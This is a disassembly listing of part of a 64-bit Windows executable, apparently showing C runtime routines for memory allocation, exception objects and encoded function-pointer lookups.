   1400033c6:	8b c8                	mov    %eax,%ecx
   1400033c8:	e8 db 3e 00 00       	call   0x1400072a8
   1400033cd:	e8 8a 3b 00 00       	call   0x140006f5c
   1400033d2:	eb 17                	jmp    0x1400033eb
   1400033d4:	8b f8                	mov    %eax,%edi
   1400033d6:	83 7c 24 40 00       	cmpl   $0x0,0x40(%rsp)
   1400033db:	75 08                	jne    0x1400033e5
   1400033dd:	8b c8                	mov    %eax,%ecx
   1400033df:	e8 20 3c 00 00       	call   0x140007004
   1400033e4:	cc                   	int3
   1400033e5:	e8 62 3b 00 00       	call   0x140006f4c
   1400033ea:	90                   	nop
   1400033eb:	8b c7                	mov    %edi,%eax
   1400033ed:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400033f2:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400033f7:	48 83 c4 30          	add    $0x30,%rsp
   1400033fb:	5f                   	pop    %rdi
   1400033fc:	c3                   	ret
   1400033fd:	cc                   	int3
   1400033fe:	cc                   	int3
   1400033ff:	cc                   	int3
   140003400:	40 53                	rex push %rbx
   140003402:	48 83 ec 20          	sub    $0x20,%rsp
   140003406:	83 3d bb 84 01 00 01 	cmpl   $0x1,0x184bb(%rip)        # 0x14001b8c8
   14000340d:	8b d9                	mov    %ecx,%ebx
   14000340f:	75 05                	jne    0x140003416
   140003411:	e8 7e 44 00 00       	call   0x140007894
   140003416:	8b cb                	mov    %ebx,%ecx
   140003418:	e8 eb 44 00 00       	call   0x140007908
   14000341d:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003422:	48 83 c4 20          	add    $0x20,%rsp
   140003426:	5b                   	pop    %rbx
   140003427:	e9 e0 3a 00 00       	jmp    0x140006f0c
   14000342c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003431:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003436:	57                   	push   %rdi
   140003437:	48 83 ec 20          	sub    $0x20,%rsp
   14000343b:	48 8b d9             	mov    %rcx,%rbx
   14000343e:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   140003442:	77 7c                	ja     0x1400034c0
   140003444:	bf 01 00 00 00       	mov    $0x1,%edi
   140003449:	48 85 c9             	test   %rcx,%rcx
   14000344c:	48 0f 45 f9          	cmovne %rcx,%rdi
   140003450:	48 8b 0d 19 7d 01 00 	mov    0x17d19(%rip),%rcx        # 0x14001b170
   140003457:	48 85 c9             	test   %rcx,%rcx
   14000345a:	75 20                	jne    0x14000347c
   14000345c:	e8 33 44 00 00       	call   0x140007894
   140003461:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   140003466:	e8 9d 44 00 00       	call   0x140007908
   14000346b:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003470:	e8 97 3a 00 00       	call   0x140006f0c
   140003475:	48 8b 0d f4 7c 01 00 	mov    0x17cf4(%rip),%rcx        # 0x14001b170
   14000347c:	4c 8b c7             	mov    %rdi,%r8
   14000347f:	33 d2                	xor    %edx,%edx
   140003481:	ff 15 29 dc 00 00    	call   *0xdc29(%rip)        # 0x1400110b0
   140003487:	48 8b f0             	mov    %rax,%rsi
   14000348a:	48 85 c0             	test   %rax,%rax
   14000348d:	75 2c                	jne    0x1400034bb
   14000348f:	39 05 37 84 01 00    	cmp    %eax,0x18437(%rip)        # 0x14001b8cc
   140003495:	74 0e                	je     0x1400034a5
   140003497:	48 8b cb             	mov    %rbx,%rcx
   14000349a:	e8 b5 01 00 00       	call   0x140003654
   14000349f:	85 c0                	test   %eax,%eax
   1400034a1:	74 0d                	je     0x1400034b0
   1400034a3:	eb ab                	jmp    0x140003450
   1400034a5:	e8 ce 10 00 00       	call   0x140004578
   1400034aa:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400034b0:	e8 c3 10 00 00       	call   0x140004578
   1400034b5:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400034bb:	48 8b c6             	mov    %rsi,%rax
   1400034be:	eb 12                	jmp    0x1400034d2
   1400034c0:	e8 8f 01 00 00       	call   0x140003654
   1400034c5:	e8 ae 10 00 00       	call   0x140004578
   1400034ca:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   1400034d0:	33 c0                	xor    %eax,%eax
   1400034d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400034d7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400034dc:	48 83 c4 20          	add    $0x20,%rsp
   1400034e0:	5f                   	pop    %rdi
   1400034e1:	c3                   	ret
   1400034e2:	cc                   	int3
   1400034e3:	cc                   	int3
   1400034e4:	48 8d 05 d5 e0 00 00 	lea    0xe0d5(%rip),%rax        # 0x1400115c0
   1400034eb:	48 89 01             	mov    %rax,(%rcx)
   1400034ee:	48 8b 02             	mov    (%rdx),%rax
   1400034f1:	c6 41 10 00          	movb   $0x0,0x10(%rcx)
   1400034f5:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400034f9:	48 8b c1             	mov    %rcx,%rax
   1400034fc:	c3                   	ret
   1400034fd:	cc                   	int3
   1400034fe:	cc                   	int3
   1400034ff:	cc                   	int3
   140003500:	40 53                	rex push %rbx
   140003502:	48 83 ec 20          	sub    $0x20,%rsp
   140003506:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   14000350b:	48 8d 05 ae e0 00 00 	lea    0xe0ae(%rip),%rax        # 0x1400115c0
   140003512:	48 8b d9             	mov    %rcx,%rbx
   140003515:	48 89 01             	mov    %rax,(%rcx)
   140003518:	c6 41 10 00          	movb   $0x0,0x10(%rcx)
   14000351c:	e8 1b 00 00 00       	call   0x14000353c
   140003521:	48 8b c3             	mov    %rbx,%rax
   140003524:	48 83 c4 20          	add    $0x20,%rsp
   140003528:	5b                   	pop    %rbx
   140003529:	c3                   	ret
   14000352a:	cc                   	int3
   14000352b:	cc                   	int3
   14000352c:	48 8d 05 8d e0 00 00 	lea    0xe08d(%rip),%rax        # 0x1400115c0
   140003533:	48 89 01             	mov    %rax,(%rcx)
   140003536:	e9 dd 00 00 00       	jmp    0x140003618
   14000353b:	cc                   	int3
   14000353c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003541:	57                   	push   %rdi
   140003542:	48 83 ec 20          	sub    $0x20,%rsp
   140003546:	48 8b fa             	mov    %rdx,%rdi
   140003549:	48 8b d9             	mov    %rcx,%rbx
   14000354c:	48 3b ca             	cmp    %rdx,%rcx
   14000354f:	74 21                	je     0x140003572
   140003551:	e8 c2 00 00 00       	call   0x140003618
   140003556:	80 7f 10 00          	cmpb   $0x0,0x10(%rdi)
   14000355a:	74 0e                	je     0x14000356a
   14000355c:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   140003560:	48 8b cb             	mov    %rbx,%rcx
   140003563:	e8 54 00 00 00       	call   0x1400035bc
   140003568:	eb 08                	jmp    0x140003572
   14000356a:	48 8b 47 08          	mov    0x8(%rdi),%rax
   14000356e:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140003572:	48 8b c3             	mov    %rbx,%rax
   140003575:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000357a:	48 83 c4 20          	add    $0x20,%rsp
   14000357e:	5f                   	pop    %rdi
   14000357f:	c3                   	ret
   140003580:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003585:	57                   	push   %rdi
   140003586:	48 83 ec 20          	sub    $0x20,%rsp
   14000358a:	48 8d 05 2f e0 00 00 	lea    0xe02f(%rip),%rax        # 0x1400115c0
   140003591:	8b da                	mov    %edx,%ebx
   140003593:	48 8b f9             	mov    %rcx,%rdi
   140003596:	48 89 01             	mov    %rax,(%rcx)
   140003599:	e8 7a 00 00 00       	call   0x140003618
   14000359e:	f6 c3 01             	test   $0x1,%bl
   1400035a1:	74 08                	je     0x1400035ab
   1400035a3:	48 8b cf             	mov    %rdi,%rcx
   1400035a6:	e8 8d ea ff ff       	call   0x140002038
   1400035ab:	48 8b c7             	mov    %rdi,%rax
   1400035ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035b3:	48 83 c4 20          	add    $0x20,%rsp
   1400035b7:	5f                   	pop    %rdi
   1400035b8:	c3                   	ret
   1400035b9:	cc                   	int3
   1400035ba:	cc                   	int3
   1400035bb:	cc                   	int3
   1400035bc:	48 85 d2             	test   %rdx,%rdx
   1400035bf:	74 54                	je     0x140003615
   1400035c1:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400035c6:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400035cb:	57                   	push   %rdi
   1400035cc:	48 83 ec 20          	sub    $0x20,%rsp
   1400035d0:	48 8b f1             	mov    %rcx,%rsi
   1400035d3:	48 8b ca             	mov    %rdx,%rcx
   1400035d6:	48 8b da             	mov    %rdx,%rbx
   1400035d9:	e8 72 f5 ff ff       	call   0x140002b50
   1400035de:	48 8b f8             	mov    %rax,%rdi
   1400035e1:	48 8d 48 01          	lea    0x1(%rax),%rcx
   1400035e5:	e8 42 fe ff ff       	call   0x14000342c
   1400035ea:	48 89 46 08          	mov    %rax,0x8(%rsi)
   1400035ee:	48 85 c0             	test   %rax,%rax
   1400035f1:	74 13                	je     0x140003606
   1400035f3:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1400035f7:	4c 8b c3             	mov    %rbx,%r8
   1400035fa:	48 8b c8             	mov    %rax,%rcx
   1400035fd:	e8 4a 48 00 00       	call   0x140007e4c
   140003602:	c6 46 10 01          	movb   $0x1,0x10(%rsi)
   140003606:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000360b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003610:	48 83 c4 20          	add    $0x20,%rsp
   140003614:	5f                   	pop    %rdi
   140003615:	c3                   	ret
   140003616:	cc                   	int3
   140003617:	cc                   	int3
   140003618:	40 53                	rex push %rbx
   14000361a:	48 83 ec 20          	sub    $0x20,%rsp
   14000361e:	80 79 10 00          	cmpb   $0x0,0x10(%rcx)
   140003622:	48 8b d9             	mov    %rcx,%rbx
   140003625:	74 09                	je     0x140003630
   140003627:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000362b:	e8 64 01 00 00       	call   0x140003794
   140003630:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   140003635:	c6 43 10 00          	movb   $0x0,0x10(%rbx)
   140003639:	48 83 c4 20          	add    $0x20,%rsp
   14000363d:	5b                   	pop    %rbx
   14000363e:	c3                   	ret
   14000363f:	cc                   	int3
   140003640:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140003645:	48 8d 05 84 df 00 00 	lea    0xdf84(%rip),%rax        # 0x1400115d0
   14000364c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140003651:	c3                   	ret
   140003652:	cc                   	int3
   140003653:	cc                   	int3
   140003654:	40 53                	rex push %rbx
   140003656:	48 83 ec 20          	sub    $0x20,%rsp
   14000365a:	48 8b d9             	mov    %rcx,%rbx
   14000365d:	48 8b 0d 7c 78 01 00 	mov    0x1787c(%rip),%rcx        # 0x14001aee0
   140003664:	ff 15 1e da 00 00    	call   *0xda1e(%rip)        # 0x140011088
   14000366a:	48 85 c0             	test   %rax,%rax
   14000366d:	74 10                	je     0x14000367f
   14000366f:	48 8b cb             	mov    %rbx,%rcx
   140003672:	ff d0                	call   *%rax
   140003674:	85 c0                	test   %eax,%eax
   140003676:	74 07                	je     0x14000367f
   140003678:	b8 01 00 00 00       	mov    $0x1,%eax
   14000367d:	eb 02                	jmp    0x140003681
   14000367f:	33 c0                	xor    %eax,%eax
   140003681:	48 83 c4 20          	add    $0x20,%rsp
   140003685:	5b                   	pop    %rbx
   140003686:	c3                   	ret
   140003687:	cc                   	int3
   140003688:	48 89 0d 51 78 01 00 	mov    %rcx,0x17851(%rip)        # 0x14001aee0
   14000368f:	c3                   	ret
   140003690:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003695:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000369a:	55                   	push   %rbp
   14000369b:	48 8b ec             	mov    %rsp,%rbp
   14000369e:	48 83 ec 60          	sub    $0x60,%rsp
   1400036a2:	0f 28 05 47 df 00 00 	movaps 0xdf47(%rip),%xmm0        # 0x1400115f0
   1400036a9:	0f 28 0d 50 df 00 00 	movaps 0xdf50(%rip),%xmm1        # 0x140011600
   1400036b0:	48 8b da             	mov    %rdx,%rbx
   1400036b3:	48 8b f9             	mov    %rcx,%rdi
   1400036b6:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400036ba:	0f 28 05 4f df 00 00 	movaps 0xdf4f(%rip),%xmm0        # 0x140011610
   1400036c1:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400036c5:	0f 28 0d 54 df 00 00 	movaps 0xdf54(%rip),%xmm1        # 0x140011620
   1400036cc:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   1400036d0:	0f 29 4d f0          	movaps %xmm1,-0x10(%rbp)
   1400036d4:	48 85 d2             	test   %rdx,%rdx
   1400036d7:	74 16                	je     0x1400036ef
   1400036d9:	f6 02 10             	testb  $0x10,(%rdx)
   1400036dc:	74 11                	je     0x1400036ef
   1400036de:	48 8b 09             	mov    (%rcx),%rcx
   1400036e1:	48 83 e9 08          	sub    $0x8,%rcx
   1400036e5:	48 8b 01             	mov    (%rcx),%rax
   1400036e8:	48 8b 58 30          	mov    0x30(%rax),%rbx
   1400036ec:	ff 50 40             	call   *0x40(%rax)
   1400036ef:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   1400036f3:	48 8b cb             	mov    %rbx,%rcx
   1400036f6:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
   1400036fa:	48 89 5d f0          	mov    %rbx,-0x10(%rbp)
   1400036fe:	ff 15 b4 d9 00 00    	call   *0xd9b4(%rip)        # 0x1400110b8
   140003704:	48 8b d0             	mov    %rax,%rdx
   140003707:	48 89 45 10          	mov    %rax,0x10(%rbp)
   14000370b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000370f:	48 85 db             	test   %rbx,%rbx
   140003712:	74 1b                	je     0x14000372f
   140003714:	f6 03 08             	testb  $0x8,(%rbx)
   140003717:	b9 00 40 99 01       	mov    $0x1994000,%ecx
   14000371c:	74 05                	je     0x140003723
   14000371e:	89 4d e0             	mov    %ecx,-0x20(%rbp)
   140003721:	eb 0c                	jmp    0x14000372f
   140003723:	8b 45 e0             	mov    -0x20(%rbp),%eax
   140003726:	48 85 d2             	test   %rdx,%rdx
   140003729:	0f 44 c1             	cmove  %ecx,%eax
   14000372c:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000372f:	44 8b 45 d8          	mov    -0x28(%rbp),%r8d
   140003733:	8b 55 c4             	mov    -0x3c(%rbp),%edx
   140003736:	8b 4d c0             	mov    -0x40(%rbp),%ecx
   140003739:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000373d:	ff 15 7d d9 00 00    	call   *0xd97d(%rip)        # 0x1400110c0
   140003743:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140003748:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   14000374c:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140003750:	49 8b e3             	mov    %r11,%rsp
   140003753:	5d                   	pop    %rbp
   140003754:	c3                   	ret
   140003755:	cc                   	int3
   140003756:	cc                   	int3
   140003757:	cc                   	int3
   140003758:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000375d:	57                   	push   %rdi
   14000375e:	48 83 ec 20          	sub    $0x20,%rsp
   140003762:	48 8d 05 cf de 00 00 	lea    0xdecf(%rip),%rax        # 0x140011638
   140003769:	8b da                	mov    %edx,%ebx
   14000376b:	48 8b f9             	mov    %rcx,%rdi
   14000376e:	48 89 01             	mov    %rax,(%rcx)
   140003771:	e8 c2 49 00 00       	call   0x140008138
   140003776:	f6 c3 01             	test   $0x1,%bl
   140003779:	74 08                	je     0x140003783
   14000377b:	48 8b cf             	mov    %rdi,%rcx
   14000377e:	e8 b5 e8 ff ff       	call   0x140002038
   140003783:	48 8b c7             	mov    %rdi,%rax
   140003786:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000378b:	48 83 c4 20          	add    $0x20,%rsp
   14000378f:	5f                   	pop    %rdi
   140003790:	c3                   	ret
   140003791:	cc                   	int3
   140003792:	cc                   	int3
   140003793:	cc                   	int3
   140003794:	48 85 c9             	test   %rcx,%rcx
   140003797:	74 37                	je     0x1400037d0
   140003799:	53                   	push   %rbx
   14000379a:	48 83 ec 20          	sub    $0x20,%rsp
   14000379e:	4c 8b c1             	mov    %rcx,%r8
   1400037a1:	48 8b 0d c8 79 01 00 	mov    0x179c8(%rip),%rcx        # 0x14001b170
   1400037a8:	33 d2                	xor    %edx,%edx
   1400037aa:	ff 15 18 d9 00 00    	call   *0xd918(%rip)        # 0x1400110c8
   1400037b0:	85 c0                	test   %eax,%eax
   1400037b2:	75 17                	jne    0x1400037cb
   1400037b4:	e8 bf 0d 00 00       	call   0x140004578
   1400037b9:	48 8b d8             	mov    %rax,%rbx
   1400037bc:	ff 15 ce d8 00 00    	call   *0xd8ce(%rip)        # 0x140011090
   1400037c2:	8b c8                	mov    %eax,%ecx
   1400037c4:	e8 cf 0d 00 00       	call   0x140004598
   1400037c9:	89 03                	mov    %eax,(%rbx)
   1400037cb:	48 83 c4 20          	add    $0x20,%rsp
   1400037cf:	5b                   	pop    %rbx
   1400037d0:	c3                   	ret
   1400037d1:	cc                   	int3
   1400037d2:	cc                   	int3
   1400037d3:	cc                   	int3
   1400037d4:	83 25 ad 95 01 00 00 	andl   $0x0,0x195ad(%rip)        # 0x14001cd88
   1400037db:	c3                   	ret
   1400037dc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400037e1:	57                   	push   %rdi
   1400037e2:	48 83 ec 40          	sub    $0x40,%rsp
   1400037e6:	48 8b d9             	mov    %rcx,%rbx
   1400037e9:	ff 15 e1 d8 00 00    	call   *0xd8e1(%rip)        # 0x1400110d0
   1400037ef:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   1400037f6:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400037fb:	45 33 c0             	xor    %r8d,%r8d
   1400037fe:	48 8b cf             	mov    %rdi,%rcx
   140003801:	ff 15 d1 d8 00 00    	call   *0xd8d1(%rip)        # 0x1400110d8
   140003807:	48 85 c0             	test   %rax,%rax
   14000380a:	74 32                	je     0x14000383e
   14000380c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003812:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140003817:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000381c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003821:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003826:	4c 8b c8             	mov    %rax,%r9
   140003829:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000382e:	33 c9                	xor    %ecx,%ecx
   140003830:	4c 8b c7             	mov    %rdi,%r8
   140003833:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003838:	ff 15 a2 d8 00 00    	call   *0xd8a2(%rip)        # 0x1400110e0
   14000383e:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003843:	48 83 c4 40          	add    $0x40,%rsp
   140003847:	5f                   	pop    %rdi
   140003848:	c3                   	ret
   140003849:	cc                   	int3
   14000384a:	cc                   	int3
   14000384b:	cc                   	int3
   14000384c:	40 53                	rex push %rbx
   14000384e:	56                   	push   %rsi
   14000384f:	57                   	push   %rdi
   140003850:	48 83 ec 40          	sub    $0x40,%rsp
   140003854:	48 8b d9             	mov    %rcx,%rbx
   140003857:	ff 15 73 d8 00 00    	call   *0xd873(%rip)        # 0x1400110d0
   14000385d:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140003864:	33 ff                	xor    %edi,%edi
   140003866:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000386b:	45 33 c0             	xor    %r8d,%r8d
   14000386e:	48 8b ce             	mov    %rsi,%rcx
   140003871:	ff 15 61 d8 00 00    	call   *0xd861(%rip)        # 0x1400110d8
   140003877:	48 85 c0             	test   %rax,%rax
   14000387a:	74 39                	je     0x1400038b5
   14000387c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003882:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140003887:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000388c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003891:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003896:	4c 8b c8             	mov    %rax,%r9
   140003899:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000389e:	33 c9                	xor    %ecx,%ecx
   1400038a0:	4c 8b c6             	mov    %rsi,%r8
   1400038a3:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400038a8:	ff 15 32 d8 00 00    	call   *0xd832(%rip)        # 0x1400110e0
   1400038ae:	ff c7                	inc    %edi
   1400038b0:	83 ff 02             	cmp    $0x2,%edi
   1400038b3:	7c b1                	jl     0x140003866
   1400038b5:	48 83 c4 40          	add    $0x40,%rsp
   1400038b9:	5f                   	pop    %rdi
   1400038ba:	5e                   	pop    %rsi
   1400038bb:	5b                   	pop    %rbx
   1400038bc:	c3                   	ret
   1400038bd:	cc                   	int3
   1400038be:	cc                   	int3
   1400038bf:	cc                   	int3
   1400038c0:	48 8b 05 b9 93 01 00 	mov    0x193b9(%rip),%rax        # 0x14001cc80
   1400038c7:	48 33 05 32 57 01 00 	xor    0x15732(%rip),%rax        # 0x140019000
   1400038ce:	74 03                	je     0x1400038d3
   1400038d0:	48 ff e0             	rex.W jmp *%rax
   1400038d3:	48 ff 25 3e d8 00 00 	rex.W jmp *0xd83e(%rip)        # 0x140011118
   1400038da:	cc                   	int3
   1400038db:	cc                   	int3
   1400038dc:	48 8b 05 a5 93 01 00 	mov    0x193a5(%rip),%rax        # 0x14001cc88
   1400038e3:	48 33 05 16 57 01 00 	xor    0x15716(%rip),%rax        # 0x140019000
   1400038ea:	74 03                	je     0x1400038ef
   1400038ec:	48 ff e0             	rex.W jmp *%rax
   1400038ef:	48 ff 25 3a d8 00 00 	rex.W jmp *0xd83a(%rip)        # 0x140011130
   1400038f6:	cc                   	int3
   1400038f7:	cc                   	int3
   1400038f8:	48 8b 05 91 93 01 00 	mov    0x19391(%rip),%rax        # 0x14001cc90
   1400038ff:	48 33 05 fa 56 01 00 	xor    0x156fa(%rip),%rax        # 0x140019000
   140003906:	74 03                	je     0x14000390b
   140003908:	48 ff e0             	rex.W jmp *%rax
   14000390b:	48 ff 25 0e d8 00 00 	rex.W jmp *0xd80e(%rip)        # 0x140011120
   140003912:	cc                   	int3
   140003913:	cc                   	int3
   140003914:	48 8b 05 7d 93 01 00 	mov    0x1937d(%rip),%rax        # 0x14001cc98
   14000391b:	48 33 05 de 56 01 00 	xor    0x156de(%rip),%rax        # 0x140019000
   140003922:	74 03                	je     0x140003927
   140003924:	48 ff e0             	rex.W jmp *%rax
   140003927:	48 ff 25 fa d7 00 00 	rex.W jmp *0xd7fa(%rip)        # 0x140011128
   14000392e:	cc                   	int3
   14000392f:	cc                   	int3
   140003930:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140003937:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000393c:	ff 15 f6 d7 00 00    	call   *0xd7f6(%rip)        # 0x140011138
   140003942:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140003947:	0f b7 4c 24 60       	movzwl 0x60(%rsp),%ecx
   14000394c:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003951:	0f 45 c1             	cmovne %ecx,%eax
   140003954:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   14000395b:	c3                   	ret
   14000395c:	48 83 ec 28          	sub    $0x28,%rsp
   140003960:	48 8b 05 39 93 01 00 	mov    0x19339(%rip),%rax        # 0x14001cca0
   140003967:	48 33 05 92 56 01 00 	xor    0x15692(%rip),%rax        # 0x140019000
   14000396e:	74 07                	je     0x140003977
   140003970:	48 83 c4 28          	add    $0x28,%rsp
   140003974:	48 ff e0             	rex.W jmp *%rax
   140003977:	ff 15 83 d7 00 00    	call   *0xd783(%rip)        # 0x140011100
   14000397d:	b8 01 00 00 00       	mov    $0x1,%eax
   140003982:	48 83 c4 28          	add    $0x28,%rsp
   140003986:	c3                   	ret
   140003987:	cc                   	int3
   140003988:	40 53                	rex push %rbx
   14000398a:	48 83 ec 20          	sub    $0x20,%rsp
   14000398e:	8b 05 7c 56 01 00    	mov    0x1567c(%rip),%eax        # 0x140019010
   140003994:	33 db                	xor    %ebx,%ebx
   140003996:	85 c0                	test   %eax,%eax
   140003998:	79 2f                	jns    0x1400039c9
   14000399a:	48 8b 05 c7 93 01 00 	mov    0x193c7(%rip),%rax        # 0x14001cd68
   1400039a1:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400039a5:	48 33 05 54 56 01 00 	xor    0x15654(%rip),%rax        # 0x140019000
   1400039ac:	74 11                	je     0x1400039bf
   1400039ae:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400039b3:	33 d2                	xor    %edx,%edx
   1400039b5:	ff d0                	call   *%rax
   1400039b7:	83 f8 7a             	cmp    $0x7a,%eax
   1400039ba:	8d 43 01             	lea    0x1(%rbx),%eax
   1400039bd:	74 02                	je     0x1400039c1
   1400039bf:	8b c3                	mov    %ebx,%eax
   1400039c1:	89 05 49 56 01 00    	mov    %eax,0x15649(%rip)        # 0x140019010
   1400039c7:	85 c0                	test   %eax,%eax
   1400039c9:	0f 9f c3             	setg   %bl
   1400039cc:	8b c3                	mov    %ebx,%eax
   1400039ce:	48 83 c4 20          	add    $0x20,%rsp
   1400039d2:	5b                   	pop    %rbx
   1400039d3:	c3                   	ret
   1400039d4:	40 53                	rex push %rbx
   1400039d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400039da:	48 8d 0d 5f dc 00 00 	lea    0xdc5f(%rip),%rcx        # 0x140011640
   1400039e1:	ff 15 59 d7 00 00    	call   *0xd759(%rip)        # 0x140011140
   1400039e7:	48 8d 15 72 dc 00 00 	lea    0xdc72(%rip),%rdx        # 0x140011660
   1400039ee:	48 8b c8             	mov    %rax,%rcx
   1400039f1:	48 8b d8             	mov    %rax,%rbx
   1400039f4:	ff 15 3e d6 00 00    	call   *0xd63e(%rip)        # 0x140011038
   1400039fa:	48 8d 15 6f dc 00 00 	lea    0xdc6f(%rip),%rdx        # 0x140011670
   140003a01:	48 8b cb             	mov    %rbx,%rcx
   140003a04:	48 33 05 f5 55 01 00 	xor    0x155f5(%rip),%rax        # 0x140019000
   140003a0b:	48 89 05 6e 92 01 00 	mov    %rax,0x1926e(%rip)        # 0x14001cc80
   140003a12:	ff 15 20 d6 00 00    	call   *0xd620(%rip)        # 0x140011038
   140003a18:	48 8d 15 59 dc 00 00 	lea    0xdc59(%rip),%rdx        # 0x140011678
   140003a1f:	48 33 05 da 55 01 00 	xor    0x155da(%rip),%rax        # 0x140019000
   140003a26:	48 8b cb             	mov    %rbx,%rcx
   140003a29:	48 89 05 58 92 01 00 	mov    %rax,0x19258(%rip)        # 0x14001cc88
   140003a30:	ff 15 02 d6 00 00    	call   *0xd602(%rip)        # 0x140011038
   140003a36:	48 8d 15 4b dc 00 00 	lea    0xdc4b(%rip),%rdx        # 0x140011688
   140003a3d:	48 33 05 bc 55 01 00 	xor    0x155bc(%rip),%rax        # 0x140019000
   140003a44:	48 8b cb             	mov    %rbx,%rcx
   140003a47:	48 89 05 42 92 01 00 	mov    %rax,0x19242(%rip)        # 0x14001cc90
   140003a4e:	ff 15 e4 d5 00 00    	call   *0xd5e4(%rip)        # 0x140011038
   140003a54:	48 8d 15 3d dc 00 00 	lea    0xdc3d(%rip),%rdx        # 0x140011698
   140003a5b:	48 33 05 9e 55 01 00 	xor    0x1559e(%rip),%rax        # 0x140019000
   140003a62:	48 8b cb             	mov    %rbx,%rcx
   140003a65:	48 89 05 2c 92 01 00 	mov    %rax,0x1922c(%rip)        # 0x14001cc98
   140003a6c:	ff 15 c6 d5 00 00    	call   *0xd5c6(%rip)        # 0x140011038
   140003a72:	48 8d 15 3f dc 00 00 	lea    0xdc3f(%rip),%rdx        # 0x1400116b8
   140003a79:	48 33 05 80 55 01 00 	xor    0x15580(%rip),%rax        # 0x140019000
   140003a80:	48 8b cb             	mov    %rbx,%rcx
   140003a83:	48 89 05 16 92 01 00 	mov    %rax,0x19216(%rip)        # 0x14001cca0
   140003a8a:	ff 15 a8 d5 00 00    	call   *0xd5a8(%rip)        # 0x140011038
   140003a90:	48 8d 15 31 dc 00 00 	lea    0xdc31(%rip),%rdx        # 0x1400116c8
   140003a97:	48 33 05 62 55 01 00 	xor    0x15562(%rip),%rax        # 0x140019000
   140003a9e:	48 8b cb             	mov    %rbx,%rcx
   140003aa1:	48 89 05 00 92 01 00 	mov    %rax,0x19200(%rip)        # 0x14001cca8
   140003aa8:	ff 15 8a d5 00 00    	call   *0xd58a(%rip)        # 0x140011038
   140003aae:	48 8d 15 2b dc 00 00 	lea    0xdc2b(%rip),%rdx        # 0x1400116e0
   140003ab5:	48 33 05 44 55 01 00 	xor    0x15544(%rip),%rax        # 0x140019000
   140003abc:	48 8b cb             	mov    %rbx,%rcx
   140003abf:	48 89 05 ea 91 01 00 	mov    %rax,0x191ea(%rip)        # 0x14001ccb0
   140003ac6:	ff 15 6c d5 00 00    	call   *0xd56c(%rip)        # 0x140011038
